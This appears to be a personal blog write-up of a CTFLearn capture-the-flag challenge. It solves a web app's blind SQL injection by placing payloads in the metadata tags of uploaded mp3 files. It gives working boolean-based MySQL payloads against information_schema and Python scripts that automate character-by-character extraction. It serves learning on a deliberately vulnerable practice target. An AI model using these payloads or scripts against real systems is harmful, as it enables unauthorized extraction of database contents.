---
layout: post
title:  "Audioedit Writeup: CTFLearn"
date:   2020-09-18 16:25:10 +0545
author: machinexa
image: /writeups/assets/images/ctflearn_audioedit_homepage.png
category: Writeups
---

The CTF was terribly insane blind SQLi. I started in morning,  lost my entire day on simple mistakes and got real frustated when doing the challenge. The URL was [https://web.ctflearn.com/audioedit/](https://web.ctflearn.com/audioedit/). I received this challenge in night from my friend **Jokr**. So, lets get started.

# Finding the Injection
As its name suggest, it takes `.mp3` file and edits it. So, we have a file upload which leads to edit page with unique generated filename. I tried playing with file upload. Eventually, it lead me to nowhere and i assumed file upload was secure. So, what to do then. Well, it took me sometime to realize the file was being fetched from database. The parameter looked like this: [?file=0b07586dffe744a6f2ee824248ed8e61283a3497.mp3](https://web.ctflearn.com/audioedit/edit.php?file=0b07586dffe744a6f2ee824248ed8e61283a3497.mp3)  

Though jokr said SQLi isnt here still I tried SQL injection and injecting a quote, i  got error **"Error fetching audio from DB"** which confirmed the vulnerability.

![Error String](/writeups/assets/images/ctflearn_audioedit_errorpage.png)

Trying SQLi for sometime again failed me. It wasnt working for some reasons (not because of rabbit). Later, injecting " gave me same error as '  which means its not vulnerable. I took some caffeine and started thinking where could i find possible attack vector as i could only upload .mp3. 

Later he gave a hint that SQLi is in exif metadata. Also, `exiftool` didnt work for mp3 file, so i had to find something different. The module `python3-mutagen` is a module for adding tags in mp3 which provided `mid3v2` a perfect cmdline script for the situation.

# Knowing the Injection
First, i confirmed the vulnerability by adding a single quote (and by testing double quote). This command injects author tag in mp3: `mid3v2 -a "' or '" testing.mp3`. I got 0 in author response which indicates condition evaluated to False. Since, running program, uploading it and checking condition is lengthy, i used `Burpsuite` which was my second mistake.  

![Burp Request](/writeups/assets/images/ctflearn_audioedit_burprequest.png)

I tried sending some advanced payloads like `' or 1=1 or '` and `' and 1=1 and '` to see how it behaves. Unfortunately, it was throwing error. Each time i tried something new, it gave a error. One more thing to notice is that sending file content with same content but entirely different filename caused **File Exist** error to be thrown. Mine frustation slowly increased with time, later i found out it was because i directly edited the request from burpsuite *(which i should never have).*

I tried to make a python3 script to upload the file and directly give me response which cost me around 1-2 hour. I used http instead of https which caused error. Finally i have a script that does automatically does everything, i just have to type the payload. Here's a small portion: 
```python
url = "https://web.ctflearn.com/audioedit/submit_upload.php"
while True:
    s = requests.Session()
    multipart_data = MultipartEncoder(
        fields = {
            'audio': ('testing.mp3', open('testing.mp3', 'rb'), 'audio/mpeg')
        })
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': multipart_data.content_type
        } 
    def setcmd():
        command = 'mid3v2 -a "' + get_random_string(4) + input("Enter SQLi payload: ") + '" testing.mp3'
        print(command)
        system(command)
    setcmd()
    response = s.post(url, data=multipart_data, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    for small in soup.find_all('small'):
        print(small)
``` 
<br>
Finally i found out what i was exploiting was boolean based blind SQLi. The injection point was `' or SQLCOMMAND or '`. For futher confirmation, i did this which i thought would eval to true and did evaluate to true `' and 2=2 or 99=99 or '`.
# Exploing SQLi Blindly
The insanity starts here. I DM'ed **Blindhero**, another of my nice mentor/friend for some tips on how to get dbms, tables.. He told me to use `SELECT CASE WHEN` which works on `Sqlite`. Unfortunately, it didnt work as it was `MySQL`. He also said about how to get database, table and so on. He constantly helped me debug my payload. Now, i started by very basic information gathering payload `' and 2=2 or (SELECT substr(version(),1,1)=5) or '`  which returned 1 and is equivalent to boolean true. 

Then, moving forward to finding current database which was not easy but ok. Since, it was boolean based blind doing it by hand would take ages. So, i coded some exploit. Crafting query took time but eventually this `' and 2=2 or (SELECT substr(database(),1,1)='a')` returned true. Here's some of my code with explanation.
```python
allchar = 'abcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
E = SQLExploit()
while True:
    for i in allchar:
        s = requests.Session()
        E.reset()
        time.sleep(0.2)
        if E.exploitdb(i) == True:
            print("Breaked loop")
            break
        else:
            continue
``` 
<br>
E is a SQLExploit object which i will talk later, and tries all the character while `reset()` function opens the mp3 file again. I ran into problem where first query ran successfully while second errored out in while loop. This again wasted my 10 minutes along with giving me some irritation. Later i fixed it by reopening the file each time i execute the loop. The SQLExploit class looks like this: 
```python
class SQLExploit:
    def __init__(self):
        self.md = ""
        self.hd = ""
        self.text = ""
        self.pos = 1

    def reset(self):
        self.md = MultipartEncoder(
            fields = {
                'audio': ('testing.mp3', open('testing.mp3', 'rb'), 'audio/mpeg')
            }
        )
        self.hd = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': self.md.content_type
        }
    def setcmd(self, character):
        #Finds database
        try:
            command = 'mid3v2 -a "' + get_random_string(5) +   "' and 2=2 or (select substr(database()," + str(self.pos) + ",1)='" + character +"') or '" + '" testing.mp3'
            print(command)
            system(command)
        except Exception as E:
            print(E)
```
<br>
`self.md` and `self.hd` are multipart data and headers respectively. `reset()` opens the mp3 file while `get_random_string(5)` gets random string of length 5 as it name says. `system()` is short of `os.system()` and position is `self.pos` is position of substr. Since, we got 1st postion as 'a', we need to increment it. `self.text` is for storing name of database found.

So, having everything we need lets start the exploit. Also, some part was slightly modified in this code which i wont show as its not necessary.
Now, lets run the exploit. 

![Database Audioedit](/writeups/assets/images/ctflearn_audioedit_database.png)

Looks nice right? Lets go for table. I asked him about how to find tables and hinted about information_schema. I created similar database and table in localhost and came up with this:  
 `(SELECT table_schema, table_name FROM information_schema.tables where table_schema = 'audioedit' and table_name LIKE 'a%' limit 1;)`

Unfortunately, its hard to include this upper payload in SQLi and thats why i did `substr()` method. Also, after debugging my payload and improving it i get:     

`' and 2=2 or (SELECT substr(table_name,1,1) FROM information_schema.tables where table_schema = 'audioedit' limit 1)='h' or '`   
 
I also modified `setcmd()` function slightly and exploiting gives me `audioedit` which is same as database name.

Ah, i was tired and irritated. Took some caffeine again and got started. For numbers of columns in that table, querying information schema i used this:   

`' and 2=2 or (SELECT substr(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
<br>
So, after running script i know number of columns are 5, now what. After writing another payload to find column it errored out no matter what i used. Now, this part was very tough to debug. I just went mad trying to find out what was the problem. It took about 3 hours to find what was the problem. I crafted about 4-5 payloads, none of them were working.
```sql
' and 2=2 or (SELECT substr(column_name,1,1) FROM information_schema.columns where table_name='audioedit' limit 1 OFFSET 1)='a' or '
' and 2=2 or (SELECT((SELECT count(*) FROM information_schema.columns WHERE table_name = 'audioedit' and column_name LIKE 'xx%')=1)) or '
' and 2=2 or (select substr(column_name,1,1)='y' from information_schema.columns where table_name = 'audioedit' limit 1,1) or '
```
<br>
First i thought `limit` was blocked as every payload used it. Trying simpler payloads like `' and 2=2 or (select version() like '5%' limit 1) or '` did work. I got to a point when payload was large, then i added `()`  which caused error. Ah, the spaces are problem. Why the hell did i used `2=2`. Shit. Also, i reduced `get_random_string()` to length of 2. Finally it worked like a charm and got the first column name, then second, then third. 

![Random Column name](/writeups/assets/images/ctflearn_audioedit_random.png)

I did some SQL magic in column File and found out the flag was in file `supersecretflagf1le.mp3`. So, i used the file parameter to reference that file and unfortunately i didnt get flag. 

# Audio Editing
Its the final step, setting visualization to sonogram and editing some other stuffs, i get the flag embedded in image.

![Random Column name](/writeups/assets/images/ctflearn_audioedit_flag.png)

Also i used this resource constantly during exploiting SQLi: [SQL Wiki](https://sqlwiki.netspi.com/)


# Takeaway 

* Always check for lenth of SQL query you can inject
* Pay attention to smaller details to prevent error
* Never edit a binary by hand in `Burpsuite`

